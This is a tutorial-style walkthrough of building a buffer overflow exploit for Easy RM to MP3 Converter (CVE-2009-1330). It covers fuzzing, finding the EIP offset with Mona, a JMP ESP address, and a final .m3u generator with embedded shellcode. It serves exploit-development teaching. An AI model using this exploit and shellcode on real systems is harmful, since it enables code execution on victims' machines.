# Easy RM to MP3 Converter 2.7.3.700 (.m3u) File WinXP Sp2 Buffer Overflow Exploit

-   cve details: [CVE-2009-1330](https://www.cvedetails.com/cve/CVE-2009-1330/)
-   Target: Easy RM to MP3 Converter 2.7.3.700
-   Platform : windows xp- SP3 - Build 2600
-   Exploit : Python 2.7
-   debugger: Immunity Debugger

I opened target program and checked its. I understood the program takes input from user in file types like: ra, m3u, pl, ... . For load file use Load button. For check program vulnerability I made a python file :

```source-shell
    exploit='A'*5000
    f=open("exploit.m3u","w")
    f.write(exploit)
    f.close() 
```
    
After load exploit.m3u, program handle its:

![](/images/1.JPG)

I add more "A" and again check it:

```source-shell
    exploit='A'*5000
    f=open("exploit.m3u","w")
    f.write(exploit)
    f.close()
    ```
Program closed witout show error and .... . I understood target maybe vulnerability.I started develop a exploit for it. I want show calce.

I run Immunity Debugger and attached target to debugger. I need find EIP and for it, I need find how many "A" input to target.I used Mona for create pattern :

![](/images/2.JPG)

Mona create pattern file in this path: Immunity Debugger path/pattern.txt . Open it and copy ASCII section to new file like exploit.m3u . Now I load this file to target that attached in Immunity. Target is closed,and now I go to Immunity and copy EIP and with Mona command (!mona po 78533778) , I find exactlly location.

![](/images/3.JPG)

Now I know number "A" (14752) and for check it , I change my exploit to below. If EIP show 42424242 ,location is true :

```source-shell
    exploit='A'*14752 + "B"*4
    f=open("exploit.m3u","w")
    f.write(exploit)
    f.close()
    ```

After load, I show program handle it and the location found by Mona was incorrect. 

![](/images/4.JPG)

I using manully approch, change number of "A" to find location. afte check some number , I find 26064. So my exploit changed to :

```source-shell
    exploit='A'*26064 + "B"*4
    f=open("exploit.m3u","w")
    f.write(exploit)
    f.close()
    ```

![](/images/5.JPG)

Now I need added my shellcode and find my shellcode's location and pass it to EIP. I change my exploit to this:

```source-shell
    exploit='A'*26064 + "B"*4 + "C"*100
    f=open("exploit.m3u","w")
    f.write(exploit)
    f.close()
    ```

![](/images/6.JPG)

I load file in target and check it in Immunity. I see my shellcode load in Stack and I only need find a command point to stack like "jmp esp" ,also I see a jump occur and 4"C" does not run, so if I add shellcode to this,My shellcode not execute. For solved first problem , I load program in Immunity and RightClick>Search for > All commands in All modules and so type jmp esp and select a result :

![](/images/7.JPG)

I select this address (7c9d30d7). I add this address (reverse) to exploit and so add shellcode :


```source-shell
    exploit= "A" * 26064 + "\xD7\x30\x9D\x7C" +(
    "\x31\xc9\xda\xd4\xb1\x33\xbd\xec\x71\x94\xde\xd9\x74\x24\xf4"
"\x5f\x31\x6f\x15\x03\x6f\x15\x83\x2b\x75\x76\x2b\x4f\x9e\xff"
"\xd4\xaf\x5f\x60\x5c\x4a\x6e\xb2\x3a\x1f\xc3\x02\x48\x4d\xe8"
"\xe9\x1c\x65\x7b\x9f\x88\x8a\xcc\x2a\xef\xa5\xcd\x9a\x2f\x69"
"\x0d\xbc\xd3\x73\x42\x1e\xed\xbc\x97\x5f\x2a\xa0\x58\x0d\xe3"
"\xaf\xcb\xa2\x80\xed\xd7\xc3\x46\x7a\x67\xbc\xe3\xbc\x1c\x76"
"\xed\xec\x8d\x0d\xa5\x14\xa5\x4a\x16\x25\x6a\x89\x6a\x6c\x07"
"\x7a\x18\x6f\xc1\xb2\xe1\x5e\x2d\x18\xdc\x6f\xa0\x60\x18\x57"
"\x5b\x17\x52\xa4\xe6\x20\xa1\xd7\x3c\xa4\x34\x7f\xb6\x1e\x9d"
"\x7e\x1b\xf8\x56\x8c\xd0\x8e\x31\x90\xe7\x43\x4a\xac\x6c\x62"
"\x9d\x25\x36\x41\x39\x6e\xec\xe8\x18\xca\x43\x14\x7a\xb2\x3c"
"\xb0\xf0\x50\x28\xc2\x5a\x3e\xaf\x46\xe1\x07\xaf\x58\xea\x27"
"\xd8\x69\x61\xa8\x9f\x75\xa0\x8d\x40\x94\x61\xfb\xe8\x01\xe0"
"\x46\x75\xb2\xde\x84\x80\x31\xeb\x74\x77\x29\x9e\x71\x33\xed"
"\x72\x0b\x2c\x98\x74\xb8\x4d\x89\x16\x5f\xde\x51\xf7\xfa\x66"
"\xf3\x07")
    f=open("exploit.m3u","w")
    f.write(exploit)
    f.close()
    ```

And finally for solved second problem,I use NOP sed. my exploit in final mode:

```source-shell
exploit= "A" * 26064 + "\xD7\x30\x9D\x7C"+ "\x90"*8 +(
    "\x31\xc9\xda\xd4\xb1\x33\xbd\xec\x71\x94\xde\xd9\x74\x24\xf4"
    "\x5f\x31\x6f\x15\x03\x6f\x15\x83\x2b\x75\x76\x2b\x4f\x9e\xff"
    "\xd4\xaf\x5f\x60\x5c\x4a\x6e\xb2\x3a\x1f\xc3\x02\x48\x4d\xe8"
    "\xe9\x1c\x65\x7b\x9f\x88\x8a\xcc\x2a\xef\xa5\xcd\x9a\x2f\x69"
    "\x0d\xbc\xd3\x73\x42\x1e\xed\xbc\x97\x5f\x2a\xa0\x58\x0d\xe3"
    "\xaf\xcb\xa2\x80\xed\xd7\xc3\x46\x7a\x67\xbc\xe3\xbc\x1c\x76"
    "\xed\xec\x8d\x0d\xa5\x14\xa5\x4a\x16\x25\x6a\x89\x6a\x6c\x07"
    "\x7a\x18\x6f\xc1\xb2\xe1\x5e\x2d\x18\xdc\x6f\xa0\x60\x18\x57"
    "\x5b\x17\x52\xa4\xe6\x20\xa1\xd7\x3c\xa4\x34\x7f\xb6\x1e\x9d"
    "\x7e\x1b\xf8\x56\x8c\xd0\x8e\x31\x90\xe7\x43\x4a\xac\x6c\x62"
    "\x9d\x25\x36\x41\x39\x6e\xec\xe8\x18\xca\x43\x14\x7a\xb2\x3c"
    "\xb0\xf0\x50\x28\xc2\x5a\x3e\xaf\x46\xe1\x07\xaf\x58\xea\x27"
    "\xd8\x69\x61\xa8\x9f\x75\xa0\x8d\x40\x94\x61\xfb\xe8\x01\xe0"
    "\x46\x75\xb2\xde\x84\x80\x31\xeb\x74\x77\x29\x9e\x71\x33\xed"
    "\x72\x0b\x2c\x98\x74\xb8\x4d\x89\x16\x5f\xde\x51\xf7\xfa\x66"
    "\xf3\x07")
    
    f=open("exploit.m3u","w")
    f.write(exploit)
    f.close()
    ```


![](/images/8.JPG)



